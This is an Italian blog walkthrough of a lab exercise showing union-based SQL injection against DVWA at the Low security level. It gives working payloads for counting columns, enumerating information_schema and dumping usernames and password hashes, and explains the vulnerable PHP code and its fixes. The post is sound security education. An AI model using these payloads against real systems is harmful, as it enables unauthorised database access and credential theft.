---
layout: post
title: "UNION SELECT: da un bypass funzionante al dump completo delle credenziali"
date: 2026-05-26
categories: [web-security, walkthrough]
tags: [sqli, dvwa, union-attack, mariadb, information_schema]
excerpt: "Il bypass della volta scorsa era solo una porta. UNION SELECT è quello che fai una volta dentro — e si scopre che il database ti dice quasi tutto se glielo chiedi nell'ordine giusto."
lang: it
page_id: sql-injection-dvwa-union-attack
permalink: /posts/union-select-dvwa-dump-credenziali/
---

L'ultima volta ho ottenuto cinque username a schermo iniettando `' OR 1=1-- +` e mi sono sentito ingiustificatamente orgoglioso di me stesso. Poi ho riletto cosa avevo effettivamente fatto: bypassato una clausola WHERE. Non avevo letto niente che non avrei dovuto leggere. Avevo solo fatto in modo che la query restituisse tutto invece di una riga sola.

Non è un data breach. È un riscaldamento.

La mossa vera è `UNION SELECT` — usare il punto di injection per agganciare una seconda query ed estrarre dati arbitrari da tabelle arbitrarie. Questo post racconta come ho imparato a farlo, passo passo, su DVWA Low. Incluso il momento in cui ho provato a unire tre colonne a una query che ne restituiva due, ho ottenuto un errore diverso da quello che mi aspettavo, e ho dovuto fermarmi a capire perché.

## Dove siamo

Stesso setup della volta scorsa: DVWA in Docker, livello di sicurezza Low, modulo SQL Injection. Il parametro vulnerabile è `id` in una richiesta GET. La query sottostante è:

```php
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
```

Due colonne. Concatenazione diretta. Nessuna difesa. Sappiamo già che l'injection funziona — ora vogliamo usarla per leggere dati.

## Passo 1: quante colonne restituisce la query?

Prima di poter fare UNION su qualsiasi cosa, devi sapere il numero di colonne della query originale. Una UNION richiede che entrambe le SELECT restituiscano lo stesso numero di colonne — altrimenti il database si rifiuta di combinarle.

Il metodo: `ORDER BY` con un numero incrementale. `ORDER BY 1` significa "ordina per la prima colonna", `ORDER BY 2` per la seconda, e così via. Quando superi l'ultima colonna, ottieni un errore.

```
?id=1'+ORDER+BY+1--+    → 200, output normale
?id=1'+ORDER+BY+2--+    → 200, output normale
?id=1'+ORDER+BY+3--+    → errore
```

L'errore su `ORDER BY 3`:

```
Unknown column '3' in 'order clause'
```

Due colonne. Confermato.

Poi ho provato a verificare con `UNION SELECT NULL,NULL,NULL` — tre NULL, solo per essere sicuro — e ho ottenuto un errore diverso:

```
The used SELECT statements have a different number of columns
```

Due errori diversi, ma la stessa informazione. Il primo viene dal parser di `ORDER BY`; il secondo dalla logica della UNION. Ti stanno dicendo la stessa cosa da due punti diversi del motore del database. Una volta visti entrambi, smetti di confonderli.

## Passo 2: quali colonne accettano stringhe?

Una colonna UNION può portare solo dati di un tipo compatibile. Se la query originale ha una colonna intera, non puoi versarci dentro una stringa — il database si lamenterà.

Su MariaDB questo raramente è un problema in pratica, perché MariaDB è piuttosto permissivo sulla coercizione dei tipi. Ma la mossa corretta è testarlo esplicitamente. Sostituisci ogni NULL con una stringa letterale e vedi cosa succede:

```
?id='+UNION+SELECT+'a','a'--+
```

Risposta:

```
First name: a
Surname: a
```

Entrambe le colonne accettano stringhe. Entrambe le colonne vengono riflesse nell'output della pagina. Questo significa che posso usarle entrambe per esfiltrare dati testuali — non sono limitato a una sola.

## Passo 3: enumerare il database con information_schema

Qui diventa interessante. MariaDB (e MySQL) viene fornito con un database built-in chiamato `information_schema` — un catalogo in sola lettura di ogni database, tabella e colonna sul server. È sempre lì. È sempre leggibile. E con un punto di injection che ti permette di eseguire SELECT arbitrarie, è sostanzialmente una mappa di tutto ciò che il database sa di sé stesso.

**Primo: in che database siamo?**

```
?id='+UNION+SELECT+database(),version()--+
```

```
First name: dvwa
Surname: 10.1.26-MariaDB-0+deb9u1
```

Database: `dvwa`. MariaDB 10.1.26 su Debian 9. Buono a sapersi — versioni diverse di MariaDB hanno funzioni built-in e comportamenti leggermente diversi.

**Secondo: che tabelle ci sono in questo database?**

```
?id='+UNION+SELECT+table_name,NULL+FROM+information_schema.tables+WHERE+table_schema=database()--+
```

```
First name: guestbook
First name: users
```

Due tabelle. `users` è quella che vogliamo.

**Terzo: che colonne ha `users`?**

```
?id='+UNION+SELECT+column_name,NULL+FROM+information_schema.columns+WHERE+table_name='users'--+
```

```
user_id, first_name, last_name, user, password, avatar, last_login, failed_login
```

Eccola. Una colonna chiamata `password`, proprio accanto a una colonna chiamata `user`. A questo punto la prossima query si scrive da sola.

## Passo 4: estrarre le credenziali

```
?id='+UNION+SELECT+user,password+FROM+users--+
```

```
First name: admin      Surname: 5f4dcc3b5aa765d61d8327deb882cf99
First name: gordonb    Surname: e99a18c428cb38d5f260853678922e03
First name: 1337       Surname: 8d3533d75ae2c3966d7e0d4fcc69216b
First name: pablo      Surname: 0d107d09f5bbe40cade3de5c71e9e9b7
First name: smithy     Surname: 5f4dcc3b5aa765d61d8327deb882cf99
```

Cinque utenti. Cinque hash MD5. E `admin` e `smithy` hanno lo stesso hash — stessa password. Sono le credenziali intenzionalmente deboli e ben note di DVWA, crackabili in secondi con qualsiasi rainbow table, ma non è questo il punto. Il punto è che sono passato da un campo form che si aspettava un intero come user ID a un dump completo della tabella delle credenziali in quattro query.

Ho detto qualcosa ad alta voce a una stanza vuota. Non vi dirò cosa.

## Perché il codice rende tutto questo banalmente facile

DVWA ha un pulsante "View Source" che mostra il PHP dietro la vulnerabilità. Il codice del livello Low:

```php
$id = $_REQUEST[ 'id' ];
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query)
    or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );

while( $row = mysqli_fetch_assoc( $result ) ) {
    echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
}
```

Tre cose hanno reso questa sessione facile invece che difficile:

**1. Concatenazione diretta.** `$id` finisce dritto nella stringa della query. Nessun escaping, nessun controllo di tipo, nessuna validazione. Il campo si aspetta un intero — un singolo `intval($id)` avrebbe ucciso ogni injection di questo post prima ancora che iniziasse.

**2. `die()` con `mysqli_error()`.** Ogni volta che un payload rompeva la sintassi della query, l'errore del database veniva stampato direttamente in pagina. Questo non è solo una vulnerabilità — è un servizio di debugging per l'attaccante. Ogni payload sbagliato arrivava con una spiegazione gratuita del perché fosse sbagliato.

**3. Ciclo `while` su tutti i risultati.** Il codice stampa ogni riga restituita dalla query. Con `UNION SELECT`, ho aggiunto righe al risultato — e il ciclo le ha stampate tutte, ubbidiente, senza alcun concetto di "aspetta, perché ci sono cinque risultati per una query che dovrebbe restituirne uno".

Queste tre cose insieme trasformano una vulnerabilità teorica in una banale. Togline una e questa sessione diventa più difficile. Toglile tutte e tre e hai il livello Impossible.

## Il pattern dietro tutto questo

L'attacco UNION ha una sequenza fissa che non cambia molto da target a target:

1. Trova il numero di colonne (`ORDER BY`)
2. Trova quali colonne sono compatibili con stringhe e visibili nell'output
3. Usa `information_schema` per mappare il database: schema → tabelle → colonne
4. Interroga le colonne che vuoi

Il passo 3 è quello che mi ha sorpreso di più quando l'ho letto per la prima volta. L'idea che il database venga con un catalogo built-in di sé stesso — e che la stessa injection che ti permette di leggere `users` ti permetta anche di leggere `information_schema.tables` — significa che non devi indovinare i nomi delle tabelle. Basta chiedere.

## Cosa viene dopo

L'intera sessione qui sopra si basava su una cosa: messaggi di errore e output visibili nella pagina. A ogni passo potevo vedere cosa funzionava e cosa no. Si chiama injection **error-based** e **union-based** — il tipo comodo, dove il database ti risponde.

Il livello successivo è la **Blind SQL Injection**, dove niente di tutto questo è disponibile. Nessun errore, nessun output, solo una pagina che dice "utente esiste" o "utente non esiste". Estrai dati un bit alla volta, facendo domande sì/no al database. È più lento, più metodico, ed è dove `sqlmap` inizia a sembrare meno un imbroglio e più una necessità — anche se lo farò prima a mano, almeno una volta.

## Takeaways

- **Il numero di colonne viene prima, sempre.** `ORDER BY` è il modo più pulito. I due errori diversi (ORDER BY vs UNION) dicono la stessa cosa — una volta visti entrambi smetti di confonderti.
- **`information_schema` è il passe-partout.** Non devi conoscere i nomi delle tabelle in anticipo. Il database te li dice, se chiedi con la query giusta.
- **Gli errori verbosi sono un regalo per l'attaccante.** `mysqli_error()` dentro una `die()` non è solo cattiva pratica — è assistenza attiva. Sopprimere gli errori non risolve l'injection, ma rende lo sfruttamento molto più difficile.
- **L'attacco UNION ha una sequenza fissa.** Colonne → tipi → schema → dati. Interiorizzare l'ordine significa che durante una sessione non stai pensando alla metodologia, la stai semplicemente eseguendo.

## Riferimenti utili

- [PortSwigger — UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [MySQL/MariaDB — information_schema.tables](https://mariadb.com/kb/en/information-schema-tables-table/)
- [PayloadsAllTheThings — SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

*Tutte le tecniche mostrate sono state eseguite in un ambiente di laboratorio isolato via Docker sul mio computer locale. Attaccare sistemi che non possiedi o per cui non hai un'autorizzazione scritta è illegale nella maggior parte delle giurisdizioni.*
